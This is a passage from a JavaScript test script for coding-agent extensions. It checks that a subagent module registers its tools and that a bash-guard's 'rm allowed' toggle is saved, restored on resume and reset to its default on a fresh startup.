			"process.env.PI_SUBAGENTS_CHILD_ID = 'smoke1';",
			"const root = process.cwd();",
			"const j = createJiti(join(root, 'package.json'), { cache: false });",
			"const m = j(join(root, 'extensions/subagents/child.ts'));",
			"const tools = [];",
			"m.default({ on(){}, registerTool:(d)=>tools.push(d.name) });",
			"if (!tools.includes('agent_done') || !tools.includes('agent_ping')) { console.error('missing: ' + tools.join(',')); process.exit(1); }",
			"console.log('ok');",
		].join("\n");
		const r = spawnSync("node", ["--input-type=module", "-e", script], { cwd: fileURLToPath(new URL("../", import.meta.url)), encoding: "utf8" });
		if (r.status !== 0) throw new Error((r.stderr || r.stdout).slice(0, 300));
	});
}

// === guard-state: персистентность toggle ===
await check("guard-state: /bash-guard:rm пишется в guard-state.json и восстанавливается новым factory", async () => {
	const stFile = join(guardAgentDir, "guard-state.json");
	let before = false;
	try {
		before = Boolean(JSON.parse(readFileSync(stFile, "utf8"))["bash-guard"]?.rmAllowed);
	} catch {}
	const piP = makePi();
	bashGuard.default(piP);
	const rmCmd = piP.commands.find((c) => c.name === "bash-guard:rm").def;
	await rmCmd.handler("", noUiCtx); // флип
	const mid = JSON.parse(readFileSync(stFile, "utf8"))["bash-guard"];
	if (mid.rmAllowed !== !before) throw new Error("файл не обновлён: " + JSON.stringify(mid));
	// Новый factory (имитация /reload): состояние подхвачено из файла — второй флип возвращает исходный
	const piNew = makePi();
	bashGuard.default(piNew);
	await piNew.commands.find((c) => c.name === "bash-guard:rm").def.handler("", noUiCtx);
	const restored = JSON.parse(readFileSync(stFile, "utf8"))["bash-guard"];
	if (restored.rmAllowed !== before) throw new Error("состояние не восстановлено: " + JSON.stringify(restored));
});

await check("guard-state: новая сессия (startup) сбрасывает в дефолт, resume — восстанавливает", async () => {
	const stFile = join(guardAgentDir, "guard-state.json");
	const seed = (obj) => {
		mkdirSync(guardAgentDir, { recursive: true });
		writeFileSync(stFile, JSON.stringify(obj, null, 2));
	};
	const readBash = () => JSON.parse(readFileSync(stFile, "utf8"))["bash-guard"] ?? {};

	// Сеём «старое» состояние (rmAllowed=true), заводим factory (прочитает его),
	// затем новая сессия (startup) → сброс в дефолт + persist.
	seed({ "bash-guard": { rmAllowed: true } });
	const piFresh = makePi();
	bashGuard.default(piFresh);
	await piFresh.handlers.session_start({ type: "session_start", reason: "startup" }, noUiCtx);
	if (readBash().rmAllowed !== false) throw new Error("startup не сбросил rmAllowed в дефолт: " + JSON.stringify(readBash()));

	// Сеём снова (rmAllowed=true), затем resume → НЕ сбрасывает (восстанавливает).
	seed({ "bash-guard": { rmAllowed: true } });
	const piResume = makePi();
	bashGuard.default(piResume);
	await piResume.handlers.session_start({ type: "session_start", reason: "resume" }, noUiCtx);
	if (readBash().rmAllowed !== true) throw new Error("resume сбросил состояние (а должен восстановить): " + JSON.stringify(readBash()));

	// pi -c: на старте процесса reason тоже "startup", но история непустая → НЕ сбрасывает.
	seed({ "bash-guard": { rmAllowed: true } });
	const piCont = makePi();
	bashGuard.default(piCont);
	const contCtx = { ...noUiCtx, sessionManager: { buildSessionContext: () => ({ messages: [{}] }) } };
	await piCont.handlers.session_start({ type: "session_start", reason: "startup" }, contCtx);
	if (readBash().rmAllowed !== true) throw new Error("startup с историей (pi -c) сбросил состояние (а должен восстановить): " + JSON.stringify(readBash()));
});

console.log(results.join("\n"));
const failed = results.filter((r) => r.startsWith("FAIL"));
process.exit(failed.length ? 1 : 0);
